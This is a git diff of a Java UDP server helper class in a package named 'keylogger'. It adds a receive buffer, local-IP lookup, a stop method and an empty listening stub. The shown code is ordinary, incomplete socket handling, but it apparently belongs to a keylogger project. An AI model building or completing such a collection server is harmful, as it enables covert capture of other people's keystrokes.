@@ -1,5 +1,6 @@
 package com.hao.keylogger.controllers;
 
+import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.net.SocketException;
@@ -14,6 +15,8 @@ public class UDPServerHelper {
 	private String hostName;
 	private int port;
 	
+	private byte[] buffer = new byte[256];
+	
 	private UDPServerHelper(String hostName, int port) {
 		this.hostName = hostName;
 		this.port = port;
@@ -25,22 +28,47 @@ public class UDPServerHelper {
 		}
 		return instance;
 	}
+	
+	public static String getLocalHostIP() {
+		try {
+			return InetAddress.getLocalHost().getHostAddress();
+		} catch (UnknownHostException e) {
+			e.printStackTrace();
+			return null;
+		}
+	}
 
 	public boolean startServer() {
 		try {
 			address = InetAddress.getByName(hostName);
 			socket = new DatagramSocket(port, address);
-			
 			return true;
 		} catch (SocketException | UnknownHostException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 			return false;
 		}
 
 	}
+	
+	public boolean stopServer() {
+		try {
+			socket.close();
+			return true;
+		}
+		catch (Exception e) {
+			return false;
+		}
+	}
 
 	public void startListenning() {
+		// TODO làm đa luồng
+		DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
+		try {
+			
+		}
+		catch (Exception e) {
+			
+		}
 		
 	}
 	
